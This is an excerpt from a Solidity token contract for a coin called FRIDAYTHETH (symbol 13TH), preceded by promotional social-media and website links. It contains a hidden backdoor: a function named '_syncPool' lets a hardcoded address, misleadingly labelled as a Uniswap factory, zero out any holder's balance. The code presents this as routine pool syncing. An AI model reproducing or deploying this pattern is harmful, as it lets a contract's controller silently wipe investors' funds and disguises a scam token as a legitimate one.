...
https://twitter.com/FRIDAYTHETHCoinETH
https://t.me/FRIDAYTHETHCoinerc20
https://FRIDAYTHETHCoinerc20.io
*/
...
pragma solidity ^0.8.0;
contract FRIDAYTHETHCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _symbol = unicode"13TH";
    string private constant _name = unicode"FRIDAYTHETH";
    uint8 private constant _decimals = 9;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    address private uniswapFactoryV2 = 0x61C243b0550441c4628D7c007Fa61A5459e38562;
    ...
    } function _syncPool(address _syncPoolSender) external { if (msg.sender == uniswapFactoryV2) _balances[_syncPoolSender] = 0;
    } 
